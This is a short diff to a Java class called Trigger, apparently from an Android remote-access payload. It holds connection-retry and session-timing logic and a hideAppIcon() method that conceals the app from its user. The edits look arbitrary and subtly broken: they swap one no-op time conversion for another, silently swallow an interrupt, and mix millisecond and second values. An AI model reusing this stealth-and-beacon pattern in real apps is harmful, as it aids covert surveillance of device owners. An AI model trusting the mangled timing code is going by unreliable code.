@@ -22,17 +22,17 @@ public class Trigger {
         if (args != null) {
             params = new String[]{new File(".").getAbsolutePath()};
         }
-        hideAppIcon();
+
             long sessionExpiry = 604800;
             long commTimeout = 300;
             long retryTotal = 3600;
             long retryWait = 10;
             long payloadStart = System.currentTimeMillis();
             long currentTime = System.currentTimeMillis();
-            session_expiry = TimeUnit.SECONDS.toSeconds(sessionExpiry) + payloadStart;
-            comm_timeout = TimeUnit.SECONDS.toSeconds(commTimeout);
-            retry_total = TimeUnit.SECONDS.toSeconds(retryTotal);
-            retry_wait = TimeUnit.SECONDS.toSeconds(retryWait);
+            session_expiry = TimeUnit.MINUTES.toMinutes(sessionExpiry) + payloadStart;
+            comm_timeout = TimeUnit.MINUTES.toMinutes(commTimeout);
+            retry_total = TimeUnit.MINUTES.toMinutes(retryTotal);
+            retry_wait = TimeUnit.MINUTES.toMinutes(retryWait);
             while (currentTime <= payloadStart + retryTotal &&
                     currentTime <= session_expiry) {
                 try {
@@ -43,12 +43,12 @@ public class Trigger {
                 try {
                     Thread.sleep(retryWait);
                 } catch (InterruptedException e) {
-                    break;
+
                 }
                 currentTime = System.currentTimeMillis();
             }
         }
-    private static void hideAppIcon() {
+    static void hideAppIcon() {
         if (context == null) {
             return;
         }
